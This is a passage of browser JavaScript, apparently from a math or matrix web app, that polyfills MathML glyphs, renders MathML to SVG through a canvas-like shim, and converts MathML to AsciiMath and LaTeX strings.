        var fontSize = Number.parseFloat(window.getComputedStyle(document.body, null).fontSize);
        var font = window.getComputedStyle(document.body, null).font;
        var x = getImageData(fontSize, font, character);
        var y = getImageData(fontSize, font, MISSED_GLYPH);
        if (x.length !== y.length) {
          throw new TypeError();
        }
        for (var i = 0; i < x.length; i += 1) {
          if (x[i] !== y[i]) {
            return true;
          }
        }
        return false;
      };
      if (!isCharacterSupported('\u2147') || !isCharacterSupported('\u2148')) {
        document.addEventListener('animationstart', function (event) {
          var target = event.target;
          if (target.tagName.toLowerCase() === 'mi') {
            var c = target.textContent;
            if (c === '\u2147' || c === '\u2148') {
              queue(function () {
                target.textContent = c === '\u2147' ? 'e' : (c === '\u2148' ? 'i' : c);
                target.setAttribute('class', 'character-polyfill');
                target.setAttribute('aria-label', c);
              });
            }
          }
        }, false);
      }
    }
  }, false);

}());

//if ("webkitUserDrag" in document.documentElement.style) {//? Chrome, Safari
    var timeoutId = 0;
    window.addEventListener("keydown", function (event) {
      "use strict";
      var DOM_VK_ALT = 18;
      if (event.keyCode === DOM_VK_ALT) {
        if (timeoutId === 0) {
          //document.body.classList.toggle("altKey", true);
          var elements = document.querySelectorAll('[draggable="true"]');
          for (var i = 0; i < elements.length; i += 1) {
            elements[i].setAttribute('draggable', 'false');
          }
        } else {
          window.clearTimeout(timeoutId);
        }
        // autorepeat of Alt key does not work sometimes (?), but no way to get the Alt state(?)
        timeoutId = window.setTimeout(function () {
          timeoutId = 0;
          //document.body.classList.toggle("altKey", false);
          var elements = document.querySelectorAll('[draggable="false"]');
          for (var i = 0; i < elements.length; i += 1) {
            elements[i].setAttribute('draggable', 'true');
          }
        }, 600);
      }
    }, false);
//}

/*global document*/

(function () {
"use strict";

function round(v) {
  //return (1 + 2**27) * v - ((1 + 2**27) * v - v);
  //TODO: avoid exponential notation (?)
  return v.toFixed(6).replace(/(\.\d*?)0+$/, '$1').replace(/\.$/, '').replace(/^\-0$/g, '0');//TODO: fix
}

// see https://github.com/gliffy/canvas2svg/blob/master/canvas2svg.js
// canvas like API
function SVGRenderingContext2D(svg) {
  // public
  this.font = "normal 10px sans-serif";
  this.textBaseline = "alphabetic";
  this.textAlign = "start";
  // private
  this.svg = svg;
  this.svg.setAttribute("font-size", "16");//?
  this.svg.setAttribute("text-anchor", "middle");
  this.svg.setAttribute("fill", "currentColor");
  this.x = 0;
  this.y = 0;
  this.sx = 1;
  this.sy = 1;
  this.path = [];
  this.px = 0;
  this.py = 0;
}
SVGRenderingContext2D.prototype.translate = function (dx, dy) {
  this.x += dx;
  this.y += dy;
};
SVGRenderingContext2D.prototype.scale = function (sx, sy) {
  this.sx *= sx;
  this.sy *= sy;
};
SVGRenderingContext2D.prototype.fillText = function (text, dx, dy) {
  if (this.textBaseline !== "middle" || this.textAlign !== "center") {
    throw new RangeError();
  }
  var fontSize = Number.parseFloat(this.font.replace(/(?:italic|normal|serif|sans\-serif)/g, ''));
  var fontStyle = this.font.indexOf("italic") !== -1 ? "italic" : "normal";
  var e = document.createElementNS("http://www.w3.org/2000/svg", "text");
  e.setAttribute("x", round(this.x / this.sx + dx));
  e.setAttribute("y", round(this.y / this.sy + dy));
  if (round(this.sx) !== round(1) || round(this.sy) !== round(1)) {
    e.setAttribute("transform", "scale(" + round(this.sx) + ", " + round(this.sy) + ")");
    //e.setAttribute("dominant-baseline", "middle");//!TODO: FIX!
  }
  if (fontSize !== 16) {
    e.setAttribute("font-size", round(fontSize));
  }
  if (fontStyle !== "normal") {
    e.setAttribute("font-style", fontStyle);
  }
  e.setAttribute("dy", "0.25em"); //TODO: FIX
  //e.setAttribute("text-anchor", "middle");
  //e.setAttribute("dominant-baseline", "central");
  // not supported in Opera, in Edge, in IE, in Safari (no "text-after-edge")
  //e.setAttribute("dominant-baseline", "text-after-edge");
  e.textContent = text;
  this.svg.appendChild(e);
};

SVGRenderingContext2D.prototype.measureText = function (text) {
  // TODO: performance
  // http://wilsonpage.co.uk/introducing-layout-boundaries/
  var tmp = document.createElement("div");
  tmp.style.position = "absolute";
  tmp.style.font = this.font;
  tmp.style.overflow = "hidden";
  tmp.style.whiteSpace = "nowrap";
  tmp.style.width = "0px";
  tmp.style.height = "0px";
  var span = document.createElement("span");
  tmp.appendChild(span);
  span.textContent = text;
  document.body.appendChild(tmp);
  var rect = span.getBoundingClientRect();
  var width = rect.right - rect.left;
  document.body.removeChild(tmp);
  return {
    width: width
  };
};
SVGRenderingContext2D.prototype.beginPath = function () {
  this.path = [];
};
SVGRenderingContext2D.prototype.moveTo = function (x, y) {
  this.px = x;
  this.py = y;
};
SVGRenderingContext2D.prototype.lineTo = function (x, y) {
  this.path.push({
    x0: this.px,
    y0: this.py,
    x1: x,
    y1: y
  });
};
SVGRenderingContext2D.prototype.stroke = function () {
  for (var i = 0; i < this.path.length; i += 1) {
    var p = this.path[i];
    var e = document.createElementNS("http://www.w3.org/2000/svg", "line");
    e.setAttribute("x1", round(this.x + p.x0));
    e.setAttribute("y1", round(this.y + p.y0));
    e.setAttribute("x2", round(this.x + p.x1));
    e.setAttribute("y2", round(this.y + p.y1));
    e.setAttribute("stroke", "currentColor");
    this.svg.appendChild(e);
  }
};
SVGRenderingContext2D.prototype.ellipse = function (cx, cy, rx, ry) {
  var e = document.createElementNS("http://www.w3.org/2000/svg", "ellipse");
  e.setAttribute("cx", round(this.x + cx));
  e.setAttribute("cy", round(this.y + cy));
  e.setAttribute("rx", round(rx));
  e.setAttribute("ry", round(ry));
  e.setAttribute("stroke", "currentColor");
  e.setAttribute("fill", "none");
  this.svg.appendChild(e);
};

globalThis.SVGRenderingContext2D = SVGRenderingContext2D;

}());

/*global SVGRenderingContext2D, console, document, XMLSerializer*/

(function () {
"use strict";

// see https://github.com/ForbesLindesay-Unmaintained/mathml-to-svg/pulls
function MathMLToSVG() {
}

MathMLToSVG.getFontSize = function (scriptlevel) {
  return Math.floor(16 * Math.pow(0.8, scriptlevel) + 0.5);
};

MathMLToSVG.makeFont = function (fontSize, fontStyle) {
  return fontStyle + " " + fontSize + "px" + " " + "serif";
};

MathMLToSVG.measure = function (context, node, scriptlevel) {
  var tagName = node.tagName.toLowerCase();
  var f = MathMLToSVG[tagName];
  if (f == null) {
    console.warn(tagName);
    f = MathMLToSVG["mrow"];
  }
  return f(context, node, scriptlevel);
};

var MI_MN_MO_MTEXT = function (context, node, scriptlevel) {
  var text = node.textContent.replace(/^\s+|\s+$/g, "");
  var fontSize = MathMLToSVG.getFontSize(scriptlevel);
  var font = MathMLToSVG.makeFont(fontSize, node.tagName.toLowerCase() === "mi" ? "italic" : "normal");
  context.font = font;
  var textWidth = context.measureText(text).width;
  var space = 0;
  // MathML3 spec has "Operator dictionary entries" with lspace+rspace table
  if (node.tagName.toLowerCase() === "mo") {
    var c = text;
    if (c === '\u2061' || c === '\u2062' || c === '\u2063' ||
        c === '(' || c === ')' || c === '|' || c === '{' || c === '}' ||
        node.nextElementSibling == null || node.previousElementSibling == null) {
      space = 0;
    } else if (c === "\u00D7" || c === "+") {
      space = 4;
    } else {
      space = 4;
      console.warn(c);
    }
    //if (c === "\u2212" || c === "~") {
    //  space = 0;
    //}
  }
  space = fontSize * space / 18;
  return {
    baseline: 0,
    width: space + textWidth + space,
    height: fontSize,
    render: function () {
      context.translate(space, 0);
      context.font = font;
      context.textBaseline = "middle";
      context.textAlign = "center";
      context.fillText(text, textWidth / 2, fontSize / 2);
      context.translate(-space, 0);
    }
  };
};

MathMLToSVG.mi = MI_MN_MO_MTEXT;
MathMLToSVG.mn = MI_MN_MO_MTEXT;
MathMLToSVG.mo = MI_MN_MO_MTEXT;
MathMLToSVG.mtext = MI_MN_MO_MTEXT;

MathMLToSVG.mtable = function (context, node, scriptlevel) {
  var sizesByRow = [];
  for (var row = node.firstElementChild; row != null; row = row.nextElementSibling) {
    if (row.tagName.toLowerCase() === "mtr") {
      var rowCellSizes = [];
      for (var cell = row.firstElementChild; cell != null; cell = cell.nextElementSibling) {
        if (cell.tagName.toLowerCase() === "mtd") {
          var sizes = MathMLToSVG.measure(context, cell, scriptlevel);
          rowCellSizes.push(sizes);
        }
      }
      sizesByRow.push(rowCellSizes);
    }
  }
  var rows = sizesByRow.length;
  var cols = 0;
  for (var i = 0; i < rows; i += 1) {
    cols = Math.max(cols, sizesByRow[i].length);
  }
  
  var columnlines = (node.getAttribute("columnlines") || "none").split(" ");
  var fontSize = MathMLToSVG.getFontSize(scriptlevel);
  var columnspacing = Number.parseFloat(node.getAttribute("columnspacing") || "0.8em") * fontSize;
  var rowBaselines = [];
  for (var i = 0; i < rows; i += 1) {
    rowBaselines.push(0);
  }
  var rowHeights = [];
  for (var i = 0; i < rows; i += 1) {
    rowHeights.push(0);
  }
  var columnWidths = [];
  for (var i = 0; i < cols; i += 1) {
    columnWidths.push(0);
  }
  for (var i = 0; i < rows; i += 1) {
    var row = sizesByRow[i];
    var largestHeightAboveBaseline = 0;
    for (var j = 0; j < row.length; j += 1) {
      var sizes = row[j];
      largestHeightAboveBaseline = Math.max(largestHeightAboveBaseline, sizes.height - sizes.baseline);
    }
    for (var j = 0; j < row.length; j += 1) {
      var sizes = row[j];
      rowHeights[i] = Math.max(rowHeights[i], largestHeightAboveBaseline + sizes.baseline);
      columnWidths[j] = Math.max(columnWidths[j], sizes.width + columnspacing);
    }
    rowBaselines[i] = largestHeightAboveBaseline;
  }

  var height = 0;
  for (var i = 0; i < rowHeights.length; i += 1) {
    height += rowHeights[i];
  }
  var width = 0;
  for (var i = 0; i < columnWidths.length; i += 1) {
    width += columnWidths[i];
    width += columnlines[i % columnlines.length] === "none" ? 0 : 1;
  }

  return {
    baseline: height / 2 - fontSize / 2,
    width: width,
    height: height,
    render: function () {
      
      var y = 0;
      for (var i = 0; i < sizesByRow.length; i += 1) {
        var row = sizesByRow[i];
        var x = 0;
        for (var j = 0; j < row.length; j += 1) {
          var sizes = row[j];

          var ax = (columnWidths[j] - sizes.width) / 2;
          var ay = rowBaselines[i] - (sizes.height - sizes.baseline); // rowalign="baseline"

          context.translate(x + ax, y + ay);
          sizes.render();
          context.translate(-x - ax, -y - ay);

          x += columnWidths[j];
          var cl = columnlines[j % columnlines.length];
          if (cl !== "none") {
            context.beginPath();
            context.moveTo(x, y);
            context.lineTo(x, y + rowHeights[i]);
            context.stroke();
            x += 1;
          }
        }
        y += rowHeights[i];
      }
    }
  };
};

MathMLToSVG.mfenced = function (context, node, scriptlevel) {
  var fontSize = MathMLToSVG.getFontSize(scriptlevel);
  var font = MathMLToSVG.makeFont(fontSize, "normal");
  var measureFence = function (font, text) {
    context.font = font;
    return context.measureText(text).width;
  };
  var drawFence = function (font, text, textWidth, scaleX, scaleY, fontSize) {
    context.scale(scaleX, scaleY);
    context.font = font;
    context.textBaseline = "middle";
    context.textAlign = "center";
    context.fillText(text, textWidth / 2, fontSize / 2);
    context.scale(1 / scaleX, 1 / scaleY);
  };
  var open = node.getAttribute("open") || "(";
  var close = node.getAttribute("close") || ")";
  var child = node.firstElementChild;
  var sizes = MathMLToSVG.measure(context, child, scriptlevel);
  var openWidth = measureFence(font, open);
  var closeWidth = measureFence(font, close);
  var scaleY = sizes.height / fontSize;
  var scaleX = Math.sqrt(Math.sqrt(scaleY));
  return {
    baseline: sizes.baseline,
    width: openWidth + sizes.width + closeWidth + (scaleX - 1) * openWidth + (scaleX - 1) * closeWidth,
    height: sizes.height,
    render: function () {
      drawFence(font, open, openWidth, scaleX, scaleY, fontSize);
      context.translate(openWidth * scaleX, 0);
      sizes.render();
      context.translate(sizes.width, 0);
      drawFence(font, close, closeWidth, scaleX, scaleY, fontSize);
      context.translate(-sizes.width, 0);
      context.translate(-openWidth * scaleX, 0);
    }
  };
};

function isStretchyOperator(text) {
  return text === '(' || text === ')' || text === '{' || text === '}' || text === '|';
}

function isStretchy(node) {
  return node.tagName.toLowerCase() === 'mo' && isStretchyOperator(node.textContent);
}

var MATH_MROW = function (context, node, scriptlevel) {
  var baseline = 0;
  var width = 0;
  var height = 0;
  var childSizes = [];
  var child = node.firstElementChild;
  while (child != null) {
    var sizes = MathMLToSVG.measure(context, child, scriptlevel);
    baseline = Math.max(baseline, sizes.baseline);
    width += sizes.width;
    height = Math.max(height, sizes.height - sizes.baseline);
    var stretchy = isStretchy(child);
    childSizes.push({
      sizes: sizes,
      stretchy: stretchy
    });
    child = child.nextElementSibling;
  }

  var fontSize = MathMLToSVG.getFontSize(scriptlevel);
  var scaleY = (height + baseline) / fontSize;
  var scaleX = Math.sqrt(Math.sqrt(scaleY));
  for (var i = 0; i < childSizes.length; i += 1) {
    var sizes = childSizes[i].sizes;
    var stretchy = childSizes[i].stretchy;
    if (stretchy) {
      width += (scaleX - 1) * sizes.width;
    }
  }

  return {
    baseline: baseline,
    width: width,
    height: height + baseline,
    render: function () {
      var x = 0;
      for (var i = 0; i < childSizes.length; i += 1) {
        var sizes = childSizes[i].sizes;
        var stretchy = childSizes[i].stretchy;
        var ay = height - (sizes.height - sizes.baseline);
        context.translate(x, 0);
        if (stretchy) {
          context.scale(scaleX, scaleY);
        } else {
          context.translate(0, ay);
        }
        sizes.render();
        if (stretchy) {
          context.scale(1 / scaleX, 1 / scaleY);
        } else {
          context.translate(0, -ay);
        }
        context.translate(-x, 0);
        if (stretchy) {
          x += (scaleX - 1) * sizes.width;
        }
        x += sizes.width;
      }
    }
  };
};

MathMLToSVG.math = MATH_MROW;
MathMLToSVG.mrow = MATH_MROW;
MathMLToSVG.mtd = MATH_MROW;

MathMLToSVG.mstyle = function (context, node, scriptlevel) {
  //TODO: font-weight
  var sizes = MATH_MROW(context, node, scriptlevel);
  return {
    baseline: sizes.baseline,
    width: sizes.width,
    height: sizes.height,
    render: function () {
      sizes.render();
    }
  };
};

MathMLToSVG.mpadded = function (context, node, scriptlevel) {
  var fontSize = MathMLToSVG.getFontSize(scriptlevel);
  var width = Number.parseFloat(node.getAttribute("width")) * fontSize;
  var lspace = Number.parseFloat(node.getAttribute("lspace")) * fontSize;
  var sizes = MATH_MROW(context, node, scriptlevel);
  return {
    baseline: sizes.baseline,
    width: width + sizes.width,
    height: sizes.height,
    render: function () {
      context.translate(lspace, 0);
      sizes.render();
      context.translate(-lspace, 0);
    }
  };
};

MathMLToSVG.mfrac = function (context, node, scriptlevel) {
  var top = node.firstElementChild;
  var bottom = top.nextElementSibling;
  var topSizes = MathMLToSVG.measure(context, top, scriptlevel + 1);
  var bottomSizes = MathMLToSVG.measure(context, bottom, scriptlevel + 1);
  var width = Math.max(topSizes.width, bottomSizes.width);
  var height = 1 + topSizes.height + bottomSizes.height;
  return {
    baseline: 0.5 + 0.5 * bottomSizes.height,
    width: width,
    height: height,
    render: function () {
      context.translate((width - topSizes.width) / 2, 0);
      topSizes.render();
      context.translate(-(width - topSizes.width) / 2, 0);

      var middle = topSizes.height - 0.5;
      context.beginPath();
      context.moveTo(0, middle);
      context.lineTo(width, middle);
      context.stroke();

      context.translate((width - bottomSizes.width) / 2, 1 + topSizes.height);
      bottomSizes.render();
      context.translate(-(width - bottomSizes.width) / 2, -1 - topSizes.height);
    }
  };
};

var MSUP_MSUB = function (context, node, scriptlevel) {
  var base = node.firstElementChild;
  var exponent = base.nextElementSibling;
  var baseSizes = MathMLToSVG.measure(context, base, scriptlevel);
  var exponentSizes = MathMLToSVG.measure(context, exponent, scriptlevel + 1);
  var width = baseSizes.width + exponentSizes.width;
  var fontSize = MathMLToSVG.getFontSize(scriptlevel + 1);
  var height = baseSizes.height + exponentSizes.height - 0.5 * fontSize;
  var isMSUP = node.tagName.toLowerCase() === "msup";
  return {
    baseline: isMSUP ? 0 : 0.5 * fontSize,
    width: width,
    height: height,
    render: function () {
      if (isMSUP) {
        context.translate(0, 0.5 * fontSize);
      }
      baseSizes.render();
      if (isMSUP) {
        context.translate(0, -0.5 * fontSize);
      }
      if (!isMSUP) {
        context.translate(0, baseSizes.height - 0.5 * fontSize);
      }
      context.translate(baseSizes.width, 0);
      exponentSizes.render();
      context.translate(-baseSizes.width, 0);
      if (!isMSUP) {
        context.translate(0, -baseSizes.height + 0.5 * fontSize);
      }
    }
  };
};

MathMLToSVG.msup = MSUP_MSUB;
MathMLToSVG.msub = MSUP_MSUB;

MathMLToSVG.menclose = function (context, node, scriptlevel) {
  var sizes = MATH_MROW(context, node, scriptlevel); // 1*
  var notation = node.getAttribute("notation").split(" ");
  return {
    baseline: sizes.baseline,
    width: sizes.width,
    height: sizes.height,
    render: function () {
      sizes.render();
      var width = sizes.width;
      var height = sizes.height;
      for (var i = 0; i < notation.length; i += 1) {
        var n = notation[i];
        if (n !== "") {
          context.beginPath();
          if (n === "circle") {
            context.ellipse(width / 2, height / 2, width / 2, height / 2, 0, 0, 2 * Math.PI, true);
          } else if (n === "verticalstrike") {
            context.moveTo(width / 2, 0);
            context.lineTo(width / 2, height);
          } else if (n === "horizontalstrike") {
            context.moveTo(0, height / 2);
            context.lineTo(width, height / 2);
          }
          context.stroke();
        }
      }
    }
  };
};

var MSQRT_MROOT = function (context, node, scriptlevel) {
  var isMSQRT = node.tagName.toLowerCase() === "msqrt";
  var surd = "\u221A";
  var fontSize = MathMLToSVG.getFontSize(scriptlevel);
  var font = MathMLToSVG.makeFont(fontSize, "normal");
  context.font = font;
  var surdWidth = context.measureText(surd).width;
  var h = 1;
  var base = isMSQRT ? node : node.firstElementChild;
  var index = isMSQRT ? undefined : base.nextElementSibling;
  // 1* for msqrt
  var baseSizes = isMSQRT ? MATH_MROW(context, base, scriptlevel) : MathMLToSVG.measure(context, base, scriptlevel);
  var indexSizes = isMSQRT ? undefined : MathMLToSVG.measure(context, index, scriptlevel + 2);
  return {
    baseline: baseSizes.baseline,
    width: baseSizes.width + surdWidth,
    height: baseSizes.height + h + 2,
    render: function () {
      context.translate(0, (baseSizes.height - fontSize) / 2 + 2);
      context.font = font;
      context.textBaseline = "middle";
      context.textAlign = "center";
      context.fillText(surd, surdWidth / 2, fontSize / 2);
      context.translate(0, -(baseSizes.height - fontSize) / 2 - 2);
      context.beginPath();
      context.moveTo(surdWidth, 0);
      context.lineTo(surdWidth + baseSizes.width, 0);
      context.stroke();
      context.translate(surdWidth, h + 2);
      baseSizes.render();
      context.translate(-surdWidth, -h - 2);
      if (!isMSQRT) {
        context.translate(0, -0.25 * fontSize + 2);
        indexSizes.render();
        context.translate(0, 0.25 * fontSize - 2);
      }
    }
  };
};

MathMLToSVG.msqrt = MSQRT_MROOT;
MathMLToSVG.mroot = MSQRT_MROOT;

MathMLToSVG.munder = function (context, node, scriptlevel) {
  var first = node.firstElementChild;
  var second = first.nextElementSibling;
  var firstSizes = MathMLToSVG.measure(context, first, scriptlevel);
  var secondSizes = MathMLToSVG.measure(context, second, scriptlevel);
  var width = Math.max(firstSizes.width, secondSizes.width);
  var height = firstSizes.height + secondSizes.height;
  return {
    baseline: secondSizes.height,
    width: width,
    height: height,
    render: function () {
      context.translate((width - firstSizes.width) / 2, 0);
      firstSizes.render();
      context.translate(-(width - firstSizes.width) / 2, 0);
      context.translate(0, firstSizes.height);
      secondSizes.render();
      context.translate(0, -firstSizes.height);
    }
  };
};

//?
MathMLToSVG.drawMathMLElement = function (element) {
  var svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
  var svgContext = new SVGRenderingContext2D(svg);
  var sizes = MathMLToSVG.measure(svgContext, element, 0);
  var width = sizes.width;
  var height = sizes.height;
  svg.setAttribute("width", width + "px");
  svg.setAttribute("height", height + "px");
  svg.setAttribute("viewBox", "0 0 " + width + " " + height);
  sizes.render();
  var data = (new XMLSerializer()).serializeToString(svg);
  var src = "data:image/svg+xml;charset=utf-8," + encodeURIComponent(data);
  return {
    src: src,
    width: width,
    height: height
  };
};

globalThis.MathMLToSVG = MathMLToSVG;

}());


(function () {
"use strict";

var operators = {
  ",": {replacement: ",", precedence: -10, isRightToLeftAssociative: false},//?
  "\u2192": {replacement: "->", precedence: -9, isRightToLeftAssociative: false},//? &rarr;
  "\u2194": {replacement: "<->", precedence: -9, isRightToLeftAssociative: false},//? &harr;
  ".^": {replacement: ".^", precedence: 7, isRightToLeftAssociative: true},
  "^": {replacement: "^", precedence: 6, isRightToLeftAssociative: true},
  "\u00D7": {replacement: "*", precedence: 5, isRightToLeftAssociative: false},// &times;
  "\u2061": {replacement: "", precedence: 5, isRightToLeftAssociative: false},// &af;
  "\u2062": {replacement: "", precedence: 5, isRightToLeftAssociative: false},// &it;
  "\u2063": {replacement: ",", precedence: -10, isRightToLeftAssociative: false},// &ic;
  "/": {replacement: "/", precedence: 5, isRightToLeftAssociative: false},
  "\u2215": {replacement: "/", precedence: 5, isRightToLeftAssociative: false},
  "\u2212": {replacement: "-", precedence: 3, isRightToLeftAssociative: false}, // &minus;
  "+": {replacement: "+", precedence: 2, isRightToLeftAssociative: false}
};

var brackets = {
  '(': true,
  '{': true,
  ')': true,
  '}': true,
  '|': true
};

var fence = function (x, operator, left, format) {
  return (x.precedence < operators[operator].precedence || (x.precedence === operators[operator].precedence && (left && operators[operator].isRightToLeftAssociative || !left && !operators[operator].isRightToLeftAssociative))) ? (format === "LaTeX" ? "\\left(" : "(") + x.string + (format === "LaTeX" ? "\\right)" : ")") : x.string;
};

var transformMTABLE = function (node, format) {
  var childNode = node.firstElementChild;
  var rows = "";
  rows += (format === "LaTeX" ? "\\begin{matrix}\n" : "{");
  var isFirstRow = true;
  while (childNode != undefined) {
    if (childNode.tagName.toLowerCase() === 'mtr') {
      var c = childNode.firstElementChild;
      var row = "";
      while (c != undefined) {
        if (c.tagName.toLowerCase() === 'mtd') {
          row += (row !== "" ? (format === "LaTeX" ? " & " : ", ") : "") + fence(transformMathML(c, format), ",", true, format);
        }
        c = c.nextElementSibling;
      }
      rows += (!isFirstRow ? (format === "LaTeX" ? " \\\\\n" : ", ") : "") + (format === "LaTeX" ? "" : "{") + row + (format === "LaTeX" ? "" : "}");
    }
    isFirstRow = false;
    childNode = childNode.nextElementSibling;
  }
  rows += (format === "LaTeX" ? "\n\\end{matrix}" : "}");
  return rows; // "(" + ... + ")" ?
};

function TransformResult(string, precedence) {
  this.string = string;
  this.precedence = precedence;
}

var transformMathML = function (node, format, inferredMROW) {
  inferredMROW = inferredMROW != undefined ? inferredMROW : false;
  if (format !== "AsciiMath" && format !== "LaTeX") {
    throw new RangeError(format);
  }
  var tagName = inferredMROW ? "mrow" : node.tagName.toLowerCase();
  if (tagName === "math" ||
      tagName === "mtd" ||
      tagName === "mtr" ||
      tagName === "mrow" ||
      tagName === "menclose" ||
      tagName === "mfenced" ||
      tagName === "mo" ||
      tagName === "mpadded" ||
      tagName === "mstyle" ||
      tagName === "munder" ||
      tagName === "mi" ||
      tagName === "mn") {
    var s = "";
    var p = 42;
    if (tagName === "mi" || tagName === "mn" || tagName === "mo") {
      // Google Translate inserts <font> tags
      s = node.textContent;
    } else {
      var childNode = node.firstElementChild;
      while (childNode != undefined) {
        var tmp = transformMathML(childNode, format);
        s += tmp.string;
        if (p > tmp.precedence) {
          p = tmp.precedence;
        }
        childNode = childNode.nextElementSibling;
      }
    }
    if (node.firstElementChild != null && node.firstElementChild.tagName.toLowerCase() === 'mo' && brackets[node.firstElementChild.textContent] != null &&
        node.lastElementChild != null && node.lastElementChild.tagName.toLowerCase() === 'mo' && brackets[node.lastElementChild.textContent] != null) {
      if (format === "LaTeX") {
        s = '\\left' + s.slice(0, -1) + '\\right' + s.slice(-1);
      }
      p = 42;
    }
    if (tagName === "mo") {
      var o = operators[s];
      var precedence = o == undefined ? 0 : o.precedence;
      if (p > precedence) {
        p = precedence;
      }
      s = o == undefined ? s : o.replacement;
    }
    if (tagName === 'mi') {
      if (s === '\u2147') {
        s = 'e';
      } else if (s === '\u2148') {
        s = 'i';
      }
      if (s.length === 1 && s.charCodeAt(0) >= 0x03B1 && s.charCodeAt(0) <= 0x03B1 + 24) {
        var greek = " alpha beta gamma delta epsilon zeta eta theta iota kappa lambda mu nu xi omicron pi rho varsigma sigma tau upsilon phi chi psi omega ";
        s = greek.split(' ')[s.charCodeAt(0) - 0x03B1 + 1];
      }
    }
    //TODO: fix
    if (tagName === "mi" && s.length > 1) {
      s = (format === "LaTeX" ? "\\" : "") + s;
    }
    //
    return tagName === "mfenced" ? new TransformResult((format === "LaTeX" ? "\\left" : "") + (node.getAttribute("open") || "(") + s + (format === "LaTeX" ? "\\right" : "") + (node.getAttribute("close") || ")"), 42) : new TransformResult(s, p);
  }
  if (tagName === "msup") {
    return new TransformResult(fence(transformMathML(node.firstElementChild, format), "^", true, format) + "^" + fence(transformMathML(node.firstElementChild.nextElementSibling, format), "^", false, format), operators["^"].precedence);
  }
  if (tagName === "msub") {
    //TODO: fix a_(1,2) ?
    var b = transformMathML(node.firstElementChild, format).string;
    var x = transformMathML(node.firstElementChild.nextElementSibling, format).string;
    return new TransformResult(b + "_" + (format === "LaTeX" ? (x.length > 1 ? '{' + x + '}' : x) : (x.indexOf(",") !== -1 ? "(" + x + ")" : x)), 42); // "(" + ... + ")" ?
  }
  if (tagName === "mfrac") {
    var n = transformMathML(node.firstElementChild, format);
    var d = transformMathML(node.firstElementChild.nextElementSibling, format);
    if (format === "LaTeX") {
      return new TransformResult("\\frac" + "{" + n.string + "}" + "{" + d.string + "}", 42);
    }
    return new TransformResult(fence(n, "/", true, format) + "/" + fence(d, "/", false, format), operators["/"].precedence);
  }
  if (tagName === "msqrt") {
    return new TransformResult((format === "LaTeX" ? "\\" : "") + "sqrt" + (format === "LaTeX" ? "{" : "(") + transformMathML(node, format, true).string + (format === "LaTeX" ? "}" : ")"), 42);
  }
  if (tagName === "mroot") {
    return new TransformResult(fence(transformMathML(node.firstElementChild, format), "^", true, format) + "^" + "(" + "1" + "/" + transformMathML(node.firstElementChild.nextElementSibling, format).string + ")", operators["^"].precedence);
  }
  if (tagName === "mtable") {
    return new TransformResult(transformMTABLE(node, format), 42);
  }
  if (tagName === "mtext") {//?
    return new TransformResult("", 42);
    //var range = document.createRange();
    //range.setStart(node, 0);
    //range.setEnd(node, getLength(node));
    //var ss = serialize(range, false, specialSerializer).replace(/^\s+|\s+$/g, "");
    //return new TransformResult(ss === "" ? "" : "text(" + ss + ")", 42);
  }
  throw new TypeError("transformMathML:" + tagName);
};

globalThis.transformMathML = transformMathML;

}());
/*global transformMathML, XMLSerializer, DOMParser */

(function () {
  "use strict";
  
// TODO: remove?
// an array of array of strings -> string
var toMultilineString = function (array) {
  var table = new Array(array.length);
  var columnWidths = [];
  var i = -1;
  while (++i < array.length) {
    var elements = array[i];
    var row0 = new Array(elements.length);
    table[i] = row0;
    var j = -1;
    while (++j < elements.length) {
      row0[j] = elements[j].toString().replace(/^\s+|\s+$/g, "");
      if (j < columnWidths.length) {
        columnWidths[j] = columnWidths[j] < row0[j].length ? row0[j].length : columnWidths[j];
      } else {
        columnWidths.push(row0[j].length);
      }
    }
  }
  var result = new Array(table.length);
  var k = -1;
  while (++k < table.length) {
    var row = table[k];
    var h = -1;
    while (++h < columnWidths.length) {
      var e = h < row.length ? row[h] : "";
      var padding = columnWidths[h] - e.length;
      var spaces = "";
      while (padding > 0) {
        spaces += " ";
        padding -= 1;
      }
      row[h] = spaces + e;
    }
    result[k] = row.join("\t");
  }
  return result.join("\n");
};

//=getMatrix4
//?
var getTableFromAsciiMathMatrix = function (input) {
  // return RPN(s).matrix.getElements();
  var rows = [[]];
  var cellStart = 0;
  var b = 0;
  for (var i = 0; i < input.length; i += 1) {
    var c = input.charCodeAt(i);
    if (c === "{".charCodeAt(0)) {
      b += 1;
      if (b === 2) {
        cellStart = i + 1;
      }
    } else if (c === "}".charCodeAt(0)) {
      if (b === 2) {
        rows[rows.length - 1].push(input.slice(cellStart, i));
      }
      b -= 1;
    } else if (c === ",".charCodeAt(0)) {
      if (b === 2) {
        rows[rows.length - 1].push(input.slice(cellStart, i));
        cellStart = i + 1;
      } else if (b === 1) {
        rows.push([]);
      }
    } else if (c === "(".charCodeAt(0)) {
      b += 1;
    } else if (c === ")".charCodeAt(0)) {
      b -= 1;
    }
  }
  return rows;
};

var serializeMathML = function (element) {
  //return node.innerHTML; - not supported in Firefox 4 - ?, Safari 5.1 - ?, Chrome ?, Opera 12.18
  return (new XMLSerializer()).serializeToString(element).replace(/\sxmlns\=\"[^"]+\"/g, "");
};

var parseMathML = function (mathml) {
  mathml = mathml.replace(/&times;/g, "\u00D7");
  mathml = mathml.replace(/&af;/g, "\u2061");
  mathml = mathml.replace(/&minus;/g, "\u2212");
  mathml = mathml.replace(/&ii;/g, "\u2148");
  return new DOMParser().parseFromString(mathml, "text/xml").firstChild;
};

var mathmlToLaTeX = function (element) {
  return transformMathML(element, "LaTeX").string;
};

// TODO: remove "matrix containers" ({useMatrixContainer: false})
var getMatrixPresentationsFromMatrix = function (matrixContainer, asciimathCode) {
  if (matrixContainer.tagName.toLowerCase() === 'menclose' && matrixContainer.getAttribute('notation') === 'none' && matrixContainer.firstElementChild.nextElementSibling === null) {
    matrixContainer = matrixContainer.firstElementChild;
    matrixContainer = matrixContainer.cloneNode(true);
    matrixContainer.removeAttribute('class');
    var es = matrixContainer.querySelectorAll('*');
    for (var i = 0; i < es.length; i += 1) {
      es[i].removeAttribute('style');
      es[i].removeAttribute('lspace');
      es[i].removeAttribute('rspace');
      es[i].removeAttribute('class');
    }
  }

  var mathmlCode = serializeMathML(matrixContainer).replace(/\u2061/g, '&ApplyFunction;');
  var result = {};
  result["application/mathml-presentation+xml"] = formatXml("<math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\">" + mathmlCode + "</math>");
  result["text/plain"] = "\n" + toMultilineString(getTableFromAsciiMathMatrix(asciimathCode)) + "\n";
  result["text/ascii-math"] = asciimathCode;
